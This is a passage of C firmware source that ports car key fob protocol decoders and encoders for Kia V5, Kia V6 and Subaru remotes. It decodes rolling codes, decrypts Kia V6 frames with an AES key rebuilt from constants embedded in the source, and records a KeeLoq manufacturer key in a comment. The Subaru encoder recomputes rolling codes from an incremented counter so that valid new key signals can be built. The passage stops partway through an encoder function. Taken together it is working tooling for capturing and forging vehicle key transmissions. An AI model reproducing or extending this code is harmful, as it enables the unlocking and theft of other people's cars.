    PpDec_kia_v5* instance = (PpDec_kia_v5*)context;
    instance->decoder.parser_step = KiaV5DecoderStepReset;
    instance->header_count = 0;
    instance->bit_count = 0;
    instance->decoded_data = 0;
    instance->saved_key = 0;
    instance->yek = 0;
    instance->crc = 0;
    instance->manchester_state = ManchesterStateMid1;
}

static void kia_v5_feed(void* context, bool level, uint32_t duration) {
    PpDec_kia_v5* instance = (PpDec_kia_v5*)context;

    switch(instance->decoder.parser_step) {
    case KiaV5DecoderStepReset:
        if((level) &&
           (DURATION_DIFF(duration, kia_v5_const.te_short) < kia_v5_const.te_delta)) {
            instance->decoder.parser_step = KiaV5DecoderStepCheckPreamble;
            instance->decoder.te_last = duration;
            instance->header_count = 1;
            instance->bit_count = 0;
            instance->decoded_data = 0;
            manchester_advance(
                instance->manchester_state,
                ManchesterEventReset,
                &instance->manchester_state,
                NULL);
        }
        break;

    case KiaV5DecoderStepCheckPreamble:
        if(level) {
            if(DURATION_DIFF(duration, kia_v5_const.te_long) < kia_v5_const.te_delta) {
                if(instance->header_count > 40) {
                    instance->decoder.parser_step = KiaV5DecoderStepData;
                    instance->bit_count = 0;
                    instance->decoded_data = 0;
                    instance->saved_key = 0;
                    instance->header_count = 0;
                } else {
                    instance->decoder.te_last = duration;
                }
            } else if(DURATION_DIFF(duration, kia_v5_const.te_short) < kia_v5_const.te_delta) {
                instance->decoder.te_last = duration;
            } else {
                instance->decoder.parser_step = KiaV5DecoderStepReset;
            }
        } else {
            if((DURATION_DIFF(duration, kia_v5_const.te_short) < kia_v5_const.te_delta) &&
               (DURATION_DIFF(instance->decoder.te_last, kia_v5_const.te_short) <
                kia_v5_const.te_delta)) {
                instance->header_count++;
            } else if(
                (DURATION_DIFF(duration, kia_v5_const.te_long) < kia_v5_const.te_delta) &&
                (DURATION_DIFF(instance->decoder.te_last, kia_v5_const.te_short) <
                 kia_v5_const.te_delta)) {
                instance->header_count++;
            } else if(
                DURATION_DIFF(instance->decoder.te_last, kia_v5_const.te_long) <
                kia_v5_const.te_delta) {
                instance->header_count++;
            } else {
                instance->decoder.parser_step = KiaV5DecoderStepReset;
            }
            instance->decoder.te_last = duration;
        }
        break;

    case KiaV5DecoderStepData: {
        ManchesterEvent event;

        if(DURATION_DIFF(duration, kia_v5_const.te_short) < kia_v5_const.te_delta) {
            event = level ? ManchesterEventShortHigh : ManchesterEventShortLow;
        } else if(DURATION_DIFF(duration, kia_v5_const.te_long) < kia_v5_const.te_delta) {
            event = level ? ManchesterEventLongHigh : ManchesterEventLongLow;
        } else {
            if(instance->bit_count >= kia_v5_const.min_count_bit_for_found) {
                instance->generic.data = instance->saved_key;
                instance->generic.data_count_bit = kia_v5_const.min_count_bit_for_found;

                instance->crc = (uint8_t)(instance->decoded_data & 0x07);

                instance->yek = 0;
                for(int i = 0; i < 8; i++) {
                    uint8_t byte = (instance->generic.data >> (i * 8)) & 0xFF;
                    uint8_t reversed = 0;
                    for(int b = 0; b < 8; b++) {
                        if(byte & (1 << b)) reversed |= (1 << (7 - b));
                    }
                    instance->yek |= ((uint64_t)reversed << ((7 - i) * 8));
                }

                instance->generic.serial = (uint32_t)((instance->yek >> 32) & 0x0FFFFFFF);
                instance->generic.btn = (uint8_t)((instance->yek >> 60) & 0x0F);

                uint32_t encrypted = (uint32_t)(instance->yek & 0xFFFFFFFF);
                instance->generic.cnt = kia_v5_mixer_decode(encrypted);

                instance->decoder.decode_data = instance->generic.data;
                instance->decoder.decode_count_bit = instance->generic.data_count_bit;

                if(instance->base.callback)
                    instance->base.callback(&instance->base, instance->base.context);
            }

            instance->decoder.parser_step = KiaV5DecoderStepReset;
            break;
        }

        bool data_bit;
        if(instance->bit_count <= 66 &&
           manchester_advance(
               instance->manchester_state, event, &instance->manchester_state, &data_bit)) {
            kia_v5_add_bit(instance, data_bit);
            if(instance->bit_count == 64) {
                instance->saved_key = instance->decoded_data;
                instance->decoded_data = 0;
            }
        }

        instance->decoder.te_last = duration;
        break;
    }
    }
}

/* ============================================================================
 * Kia V6 — Flipper-ARF (GPL, clé embarquée)
 *
 * Manchester-coded 144-bit AES-128 frame. The AES S-boxes and the AES key
 * (derived from embedded keystore constants in kia_v6_get_aes_key) are all
 * in-source — no external keystore.
 * ==========================================================================*/

#define KIA_V6_XOR_MASK_LOW  0x84AF25FB
#define KIA_V6_XOR_MASK_HIGH 0x638766AB

static const SubGhzBlockConst kia_v6_const = {
    .te_short = 200,
    .te_long = 400,
    .te_delta = 100,
    .min_count_bit_for_found = 144,
};

static const uint8_t kia_v6_aes_sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab,
    0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4,
    0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71,
    0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2,
    0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6,
    0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb,
    0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45,
    0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44,
    0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a,
    0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49,
    0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d,
    0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25,
    0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e,
    0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1,
    0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb,
    0x16};

static const uint8_t kia_v6_aes_sbox_inv[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7,
    0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde,
    0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42,
    0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49,
    0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c,
    0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15,
    0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7,
    0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02,
    0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc,
    0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad,
    0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d,
    0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b,
    0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8,
    0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51,
    0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0,
    0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c,
    0x7d};

static const uint8_t kia_v6_aes_rcon[10] =
    {0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36};

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    uint16_t header_count;

    ManchesterState manchester_state;

    uint32_t data_part1_low;
    uint32_t data_part1_high;

    uint32_t stored_part1_low;
    uint32_t stored_part1_high;
    uint32_t stored_part2_low;
    uint32_t stored_part2_high;
    uint16_t data_part3;

    uint8_t bit_count;
    uint8_t fx_field;
    uint8_t crc1_field;
    uint8_t crc2_field;
} PpDec_kia_v6;

typedef enum {
    KiaV6DecoderStepReset = 0,
    KiaV6DecoderStepWaitFirstHigh,
    KiaV6DecoderStepCountPreamble,
    KiaV6DecoderStepWaitLongHigh,
    KiaV6DecoderStepData,
} KiaV6DecoderStep;

#define kia_v6_crc8(data, len) subghz_protocol_blocks_crc8((data), (len), 0x07, 0xFF)

static uint8_t kia_v6_gf_mul2(uint8_t x) {
    return ((x >> 7) * 0x1b) ^ (x << 1);
}

static void kia_v6_aes_subbytes_inv(uint8_t* state) {
    for(int row = 0; row < 4; row++) {
        for(int col = 0; col < 4; col++) {
            state[row + col * 4] = kia_v6_aes_sbox_inv[state[row + col * 4]];
        }
    }
}

static void kia_v6_aes_shiftrows_inv(uint8_t* state) {
    uint8_t temp;

    temp = state[13];
    state[13] = state[9];
    state[9] = state[5];
    state[5] = state[1];
    state[1] = temp;

    temp = state[2];
    state[2] = state[10];
    state[10] = temp;
    temp = state[6];
    state[6] = state[14];
    state[14] = temp;

    temp = state[3];
    state[3] = state[7];
    state[7] = state[11];
    state[11] = state[15];
    state[15] = temp;
}

static void kia_v6_aes_mixcolumns_inv(uint8_t* state) {
    uint8_t a, b, c, d;
    for(int i = 0; i < 4; i++) {
        a = state[i * 4];
        b = state[i * 4 + 1];
        c = state[i * 4 + 2];
        d = state[i * 4 + 3];

        uint8_t a2 = kia_v6_gf_mul2(a);
        uint8_t a4 = kia_v6_gf_mul2(a2);
        uint8_t a8 = kia_v6_gf_mul2(a4);
        uint8_t b2 = kia_v6_gf_mul2(b);
        uint8_t b4 = kia_v6_gf_mul2(b2);
        uint8_t b8 = kia_v6_gf_mul2(b4);
        uint8_t c2 = kia_v6_gf_mul2(c);
        uint8_t c4 = kia_v6_gf_mul2(c2);
        uint8_t c8 = kia_v6_gf_mul2(c4);
        uint8_t d2 = kia_v6_gf_mul2(d);
        uint8_t d4 = kia_v6_gf_mul2(d2);
        uint8_t d8 = kia_v6_gf_mul2(d4);

        state[i * 4] = (a8 ^ a4 ^ a2) ^ (b8 ^ b2 ^ b) ^ (c8 ^ c4 ^ c) ^ (d8 ^ d);
        state[i * 4 + 1] = (a8 ^ a) ^ (b8 ^ b4 ^ b2) ^ (c8 ^ c2 ^ c) ^ (d8 ^ d4 ^ d);
        state[i * 4 + 2] = (a8 ^ a4 ^ a) ^ (b8 ^ b) ^ (c8 ^ c4 ^ c2) ^ (d8 ^ d2 ^ d);
        state[i * 4 + 3] = (a8 ^ a2 ^ a) ^ (b8 ^ b4 ^ b) ^ (c8 ^ c) ^ (d8 ^ d4 ^ d2);
    }
}

static void kia_v6_aes_addroundkey(uint8_t* state, const uint8_t* round_key) {
    for(int col = 0; col < 4; col++) {
        state[col * 4] ^= round_key[col * 4];
        state[col * 4 + 1] ^= round_key[col * 4 + 1];
        state[col * 4 + 2] ^= round_key[col * 4 + 2];
        state[col * 4 + 3] ^= round_key[col * 4 + 3];
    }
}

static void kia_v6_aes_key_expansion(const uint8_t* key, uint8_t* round_keys) {
    for(int i = 0; i < 16; i++) {
        round_keys[i] = key[i];
    }

    for(int i = 4; i < 44; i++) {
        int prev_word_idx = (i - 1) * 4;
        uint8_t b0 = round_keys[prev_word_idx];
        uint8_t b1 = round_keys[prev_word_idx + 1];
        uint8_t b2 = round_keys[prev_word_idx + 2];
        uint8_t b3 = round_keys[prev_word_idx + 3];

        if((i % 4) == 0) {
            uint8_t new_b0 = kia_v6_aes_sbox[b1] ^ kia_v6_aes_rcon[(i / 4) - 1];
            uint8_t new_b1 = kia_v6_aes_sbox[b2];
            uint8_t new_b2 = kia_v6_aes_sbox[b3];
            uint8_t new_b3 = kia_v6_aes_sbox[b0];
            b0 = new_b0;
            b1 = new_b1;
            b2 = new_b2;
            b3 = new_b3;
        }

        int back_word_idx = (i - 4) * 4;
        b0 ^= round_keys[back_word_idx];
        b1 ^= round_keys[back_word_idx + 1];
        b2 ^= round_keys[back_word_idx + 2];
        b3 ^= round_keys[back_word_idx + 3];

        int curr_word_idx = i * 4;
        round_keys[curr_word_idx] = b0;
        round_keys[curr_word_idx + 1] = b1;
        round_keys[curr_word_idx + 2] = b2;
        round_keys[curr_word_idx + 3] = b3;
    }
}

static void kia_v6_aes128_decrypt(const uint8_t* expanded_key, uint8_t* data) {
    uint8_t state[16];
    memcpy(state, data, 16);

    kia_v6_aes_addroundkey(state, &expanded_key[160]);

    for(int round = 9; round > 0; round--) {
        kia_v6_aes_shiftrows_inv(state);
        kia_v6_aes_subbytes_inv(state);
        kia_v6_aes_addroundkey(state, &expanded_key[round * 16]);
        kia_v6_aes_mixcolumns_inv(state);
    }

    kia_v6_aes_shiftrows_inv(state);
    kia_v6_aes_subbytes_inv(state);
    kia_v6_aes_addroundkey(state, &expanded_key[0]);

    memcpy(data, state, 16);
}

static void kia_v6_get_aes_key(uint8_t* aes_key) {
    uint64_t keystore_a = 0x37CE21F8C9F862A8ULL ^ 0x5448455049524154ULL;
    uint32_t keystore_a_hi = (keystore_a >> 32) & 0xFFFFFFFF;
    uint32_t keystore_a_lo = keystore_a & 0xFFFFFFFF;

    uint32_t uVar15_a = keystore_a_lo ^ KIA_V6_XOR_MASK_LOW;
    uint32_t uVar5_a = KIA_V6_XOR_MASK_HIGH ^ keystore_a_hi;

    uint64_t val64_a = ((uint64_t)uVar5_a << 32) | uVar15_a;
    for(int i = 0; i < 8; i++) {
        aes_key[i] = (val64_a >> (56 - i * 8)) & 0xFF;
    }

    uint64_t keystore_b = 0x3FC629F0C1F06AA0ULL ^ 0x5448455049524154ULL;
    uint32_t keystore_b_hi = (keystore_b >> 32) & 0xFFFFFFFF;
    uint32_t keystore_b_lo = keystore_b & 0xFFFFFFFF;

    uint32_t uVar15_b = keystore_b_lo ^ KIA_V6_XOR_MASK_LOW;
    uint32_t uVar5_b = KIA_V6_XOR_MASK_HIGH ^ keystore_b_hi;

    uint64_t val64_b = ((uint64_t)uVar5_b << 32) | uVar15_b;
    for(int i = 0; i < 8; i++) {
        aes_key[i + 8] = (val64_b >> (56 - i * 8)) & 0xFF;
    }
}

static bool kia_v6_decrypt(PpDec_kia_v6* instance) {
    uint8_t encrypted_data[16];

    encrypted_data[0] = (instance->stored_part1_high >> 8) & 0xFF;
    encrypted_data[1] = instance->stored_part1_high & 0xFF;

    encrypted_data[2] = (instance->stored_part1_low >> 24) & 0xFF;
    encrypted_data[3] = (instance->stored_part1_low >> 16) & 0xFF;
    encrypted_data[4] = (instance->stored_part1_low >> 8) & 0xFF;
    encrypted_data[5] = instance->stored_part1_low & 0xFF;

    encrypted_data[6] = (instance->stored_part2_high >> 24) & 0xFF;
    encrypted_data[7] = (instance->stored_part2_high >> 16) & 0xFF;
    encrypted_data[8] = (instance->stored_part2_high >> 8) & 0xFF;
    encrypted_data[9] = instance->stored_part2_high & 0xFF;

    encrypted_data[10] = (instance->stored_part2_low >> 24) & 0xFF;
    encrypted_data[11] = (instance->stored_part2_low >> 16) & 0xFF;
    encrypted_data[12] = (instance->stored_part2_low >> 8) & 0xFF;
    encrypted_data[13] = instance->stored_part2_low & 0xFF;

    encrypted_data[14] = (instance->data_part3 >> 8) & 0xFF;
    encrypted_data[15] = instance->data_part3 & 0xFF;

    uint8_t fx_byte0 = (instance->stored_part1_high >> 24) & 0xFF;
    uint8_t fx_byte1 = (instance->stored_part1_high >> 16) & 0xFF;
    instance->fx_field = ((fx_byte0 & 0xF) << 4) | (fx_byte1 & 0xF);

    uint8_t aes_key[16];
    kia_v6_get_aes_key(aes_key);
    uint8_t expanded_key[176];
    kia_v6_aes_key_expansion(aes_key, expanded_key);
    kia_v6_aes128_decrypt(expanded_key, encrypted_data);

    uint8_t* decrypted = encrypted_data;

    uint8_t calculated_crc = kia_v6_crc8(decrypted, 15);
    uint8_t stored_crc = decrypted[15];

    instance->generic.serial =
        ((uint32_t)decrypted[4] << 16) | ((uint32_t)decrypted[5] << 8) | decrypted[6];

    instance->generic.btn = decrypted[7];

    instance->generic.cnt = ((uint32_t)decrypted[8] << 24) | ((uint32_t)decrypted[9] << 16) |
                            ((uint32_t)decrypted[10] << 8) | decrypted[11];

    instance->crc1_field = decrypted[12];

    instance->crc2_field = decrypted[15];

    return (calculated_crc ^ stored_crc) < 2;
}

static void* kia_v6_alloc(void) {
    PpDec_kia_v6* i = (PpDec_kia_v6*)calloc(1, sizeof(PpDec_kia_v6));
    if(!i) return NULL;
    i->generic.protocol_name = "Kia V6";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void kia_v6_reset(void* context) {
    PpDec_kia_v6* instance = (PpDec_kia_v6*)context;
    instance->decoder.parser_step = KiaV6DecoderStepReset;
    instance->header_count = 0;
    instance->bit_count = 0;
    instance->data_part1_low = 0;
    instance->data_part1_high = 0;
    manchester_advance(
        instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);
}

static void kia_v6_feed(void* context, bool level, uint32_t duration) {
    PpDec_kia_v6* instance = (PpDec_kia_v6*)context;

    switch(instance->decoder.parser_step) {
    case KiaV6DecoderStepReset:
        if(level == 0) {
            return;
        }
        if(DURATION_DIFF(duration, kia_v6_const.te_short) < kia_v6_const.te_delta) {
            instance->decoder.parser_step = KiaV6DecoderStepWaitFirstHigh;
            instance->decoder.te_last = duration;
            instance->header_count = 0;
            manchester_advance(
                instance->manchester_state,
                ManchesterEventReset,
                &instance->manchester_state,
                NULL);
        }
        return;

    case KiaV6DecoderStepWaitFirstHigh: {
        if(level != 0) {
            return;
        }
        uint32_t diff_short = DURATION_DIFF(duration, kia_v6_const.te_short);
        uint32_t diff_long = DURATION_DIFF(duration, kia_v6_const.te_long);

        uint32_t diff = (diff_long < diff_short) ? diff_long : diff_short;

        if(diff_long < kia_v6_const.te_delta && diff_long < diff_short) {
            if(instance->header_count >= 0x259) {
                instance->header_count = 0;
                instance->decoder.te_last = duration;
                instance->decoder.parser_step = KiaV6DecoderStepWaitLongHigh;
                return;
            }
        }

        if(diff >= kia_v6_const.te_delta) {
            instance->decoder.parser_step = KiaV6DecoderStepReset;
            return;
        }

        if(DURATION_DIFF(instance->decoder.te_last, kia_v6_const.te_short) < kia_v6_const.te_delta) {
            instance->decoder.te_last = duration;
            instance->header_count++;
            return;
        } else {
            instance->decoder.parser_step = KiaV6DecoderStepReset;
            return;
        }

    }
    case KiaV6DecoderStepWaitLongHigh: {
        if(level == 0) {
            instance->decoder.parser_step = KiaV6DecoderStepReset;
            return;
        }
        uint32_t diff_long_check = DURATION_DIFF(duration, kia_v6_const.te_long);
        uint32_t diff_short_check = DURATION_DIFF(duration, kia_v6_const.te_short);

        if(diff_long_check >= kia_v6_const.te_delta) {
            if(diff_short_check >= kia_v6_const.te_delta) {
                instance->decoder.parser_step = KiaV6DecoderStepReset;
                return;
            }
        }

        if(DURATION_DIFF(instance->decoder.te_last, kia_v6_const.te_long) >=
           kia_v6_const.te_delta) {
            instance->decoder.parser_step = KiaV6DecoderStepReset;
            return;
        }
        instance->decoder.decode_data = 0;
        instance->decoder.decode_count_bit = 0;

        subghz_protocol_blocks_add_bit(&instance->decoder, 1);
        subghz_protocol_blocks_add_bit(&instance->decoder, 1);
        subghz_protocol_blocks_add_bit(&instance->decoder, 0);
        subghz_protocol_blocks_add_bit(&instance->decoder, 1);

        instance->data_part1_low = (uint32_t)(instance->decoder.decode_data & 0xFFFFFFFF);
        instance->data_part1_high = (uint32_t)((instance->decoder.decode_data >> 32) & 0xFFFFFFFF);
        instance->bit_count = instance->decoder.decode_count_bit;

        instance->decoder.parser_step = KiaV6DecoderStepData;
        return;
    }

    case KiaV6DecoderStepData: {
        ManchesterEvent event;
        bool data_bit;

        if(DURATION_DIFF(duration, kia_v6_const.te_short) < kia_v6_const.te_delta) {
            event = (level & 0x7F) << 1;
        } else if(DURATION_DIFF(duration, kia_v6_const.te_long) < kia_v6_const.te_delta) {
            event = level ? ManchesterEventLongHigh : ManchesterEventLongLow;
        } else {
            instance->decoder.parser_step = KiaV6DecoderStepReset;
            return;
        }

        if(manchester_advance(
               instance->manchester_state, event, &instance->manchester_state, &data_bit)) {
            uint32_t uVar4 = instance->data_part1_low;
            uint32_t uVar5 = (uVar4 << 1) | (data_bit ? 1 : 0);
            uint32_t carry = (uVar4 >> 31) & 1;
            uVar4 = (instance->data_part1_high << 1) | carry;
            instance->data_part1_low = uVar5;
            instance->data_part1_high = uVar4;
            instance->decoder.decode_data = ((uint64_t)uVar4 << 32) | uVar5;
            instance->bit_count++;

            if(instance->bit_count == 0x40) {
                instance->stored_part1_low = ~uVar5;
                instance->stored_part1_high = ~uVar4;
                instance->data_part1_low = 0;
                instance->data_part1_high = 0;
            } else if(instance->bit_count == 0x80) {
                instance->stored_part2_low = ~uVar5;
                instance->stored_part2_high = ~uVar4;
                instance->data_part1_low = 0;
                instance->data_part1_high = 0;
            }
        }

        instance->decoder.te_last = duration;

        if(instance->bit_count != kia_v6_const.min_count_bit_for_found) {
            return;
        }

        instance->generic.data_count_bit = kia_v6_const.min_count_bit_for_found;
        instance->data_part3 = ~((uint16_t)instance->data_part1_low);
        instance->generic.data =
            ((uint64_t)instance->stored_part1_high << 32) | instance->stored_part1_low;

        kia_v6_decrypt(instance);

        if(instance->base.callback) {
            instance->base.callback(&instance->base, instance->base.context);
        }

        instance->data_part1_low = 0;
        instance->data_part1_high = 0;
        instance->bit_count = 0;
        instance->decoder.parser_step = KiaV6DecoderStepReset;
        return;
    }

    default:
        return;
    }
}

/* ============================================================================
 * REGISTRY + UNRESOLVED REPORT
 *
 * (a) REGISTRY — ported decoders (all keys embedded, no external keystore):
 *     { "Kia V3/V4", kia_v3v4_alloc, kia_v3v4_feed, kia_v3v4_reset, nullptr },
 *     { "Kia V5",    kia_v5_alloc,   kia_v5_feed,   kia_v5_reset,   nullptr },
 *     { "Kia V6",    kia_v6_alloc,   kia_v6_feed,   kia_v6_reset,   nullptr },
 *
 * (b) UNRESOLVED — none.
 *     Kia V3/V4: KIA_MF_KEY (0xA8F5DFFC8DAA5CDB) + subghz_protocol_keeloq_common_decrypt
 *                ported ONCE above (KEELOQ_NLF embedded). No keystore.
 *     Kia V5:    kia_v5_keystore_bytes[] embedded, feeds kia_v5_mixer_decode. No keystore.
 *     Kia V6:    AES S-boxes + AES key (kia_v6_get_aes_key, keystore constants
 *                XOR-embedded in-source) all in-file. No keystore.
 * ==========================================================================*/

// ===== ProtoPirate encoders (GPLv3) =====

// Alias consts décode <- noms d'origine référencés par les encoders
#define subghz_protocol_subaru_const subaru_const
#define kia_protocol_v2_const kia_v2_const
// ============================================================================
// pp_enc_subkia.h  --  ProtoPirate encoder (GPLv3)
//
// Self-contained ENCODE-path fragment for Subaru / Kia v2 / Kia v7 car keys.
// Ported from ProtoPirate (GPLv3) protocols/{subaru,kia_v2,kia_v7}.c, the
// `#if PROTOPIRATE_WITH_ENCODER` blocks (*_deserialize reconstruction +
// *_get_upload waveform builders).
//
// Depends ONLY on the firmware-provided encoder shim (LevelDuration,
// level_duration_make, pp_emit family, bit_read, pp_u64_to_bytes_be,
// pp_bytes_to_u64_be, subghz_protocol_blocks_crc8) and on the DECODE-side
// timing constants `subghz_protocol_subaru_const`, `kia_protocol_v2_const`,
// `kia_protocol_v7_const` (already defined by the decode shim — NOT redefined
// here). Every new static/constant is prefixed `<p>_enc_` to avoid collisions.
//
// No #include / #pragma once (fragment).
// ============================================================================

// ============================================================================
// SUBARU  --  ProtoPirate encoder (GPLv3)
// Modulation: AM (OOK)  ->  is_fsk = false
// Rolling code: algorithmic (bit shuffle + 3-byte rotate). No secret key.
// ============================================================================

static const int      subaru_enc_preamble_pairs   = 75;
static const uint32_t subaru_enc_gap_us           = 2800;
static const uint32_t subaru_enc_sync_us          = 2800;
static const size_t   subaru_enc_upload_capacity  = 320U; // >= 282 slots emitted
static const bool     subaru_enc_is_fsk           = false;

// Port of subaru_encode_count() : rewrites KB[4..7] from serial (KB[1..3]),
// button (KB[0] low nibble) and the 16-bit counter.
static void subaru_enc_count(uint8_t* KB, uint16_t count) {
    uint8_t lo = count & 0xFF;
    uint8_t hi = (count >> 8) & 0xFF;

    KB[4] &= ~0xC0;
    KB[5] &= ~0xC3;
    KB[6] &= ~0x03;

    if((lo & 0x01) == 0) KB[4] |= 0x40;
    if((lo & 0x02) == 0) KB[4] |= 0x80;
    if((lo & 0x04) == 0) KB[5] |= 0x01;
    if((lo & 0x08) == 0) KB[5] |= 0x02;
    if((lo & 0x10) == 0) KB[6] |= 0x01;
    if((lo & 0x20) == 0) KB[6] |= 0x02;
    if((lo & 0x40) == 0) KB[5] |= 0x40;
    if((lo & 0x80) == 0) KB[5] |= 0x80;

    uint8_t SER0 = KB[3];
    uint8_t SER1 = KB[1];
    uint8_t SER2 = KB[2];

    uint8_t total_rot = 4 + lo;
    for(uint8_t i = 0; i < total_rot; ++i) {
        uint8_t t_bit = (SER0 >> 7) & 1;
        SER0 = ((SER0 << 1) & 0xFE) | ((SER1 >> 7) & 1);
        SER1 = ((SER1 << 1) & 0xFE) | ((SER2 >> 7) & 1);
        SER2 = ((SER2 << 1) & 0xFE) | t_bit;
    }

    const uint8_t rel = (uint8_t)(SER0 ^ KB[0]);
    KB[4] = (uint8_t)((KB[4] & 0xC0) | ((rel >> 2) & 0x3F));
    KB[5] = (uint8_t)((KB[5] & 0xCF) | ((rel << 4) & 0x30));

    uint8_t T1 = 0xFF;
    uint8_t T2 = 0xFF;

    if(hi & 0x04) T1 &= ~0x10;
    if(hi & 0x08) T1 &= ~0x20;
    if(hi & 0x02) T2 &= ~0x80;
    if(hi & 0x01) T2 &= ~0x40;
    if(hi & 0x40) T1 &= ~0x01;
    if(hi & 0x80) T1 &= ~0x02;
    if(hi & 0x20) T2 &= ~0x08;
    if(hi & 0x10) T2 &= ~0x04;

    uint8_t new_REG_SH1 = T1 ^ SER1;
    uint8_t new_REG_SH2 = T2 ^ SER2;

    KB[5] &= ~0x0C;
    KB[6] &= ~0xC0;

    KB[7] = (KB[7] & 0xF0) | ((new_REG_SH1 >> 4) & 0x0F);

    if(new_REG_SH1 & 0x04) KB[5] |= 0x04;
    if(new_REG_SH1 & 0x08) KB[5] |= 0x08;
    if(new_REG_SH1 & 0x02) KB[6] |= 0x80;
    if(new_REG_SH1 & 0x01) KB[6] |= 0x40;

    KB[6] = (KB[6] & 0xC3) | ((new_REG_SH2 >> 2) & 0x3C);

    KB[7] = (KB[7] & 0x0F) | ((new_REG_SH2 << 4) & 0xF0);
}

// Rebuild the 64-bit key from serial/btn/cnt (caller passes cnt already
// incremented). b[0] high nibble is a fixed/unknown field not carried by these
// args; it is assumed 0 (see limitations).
static bool subaru_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
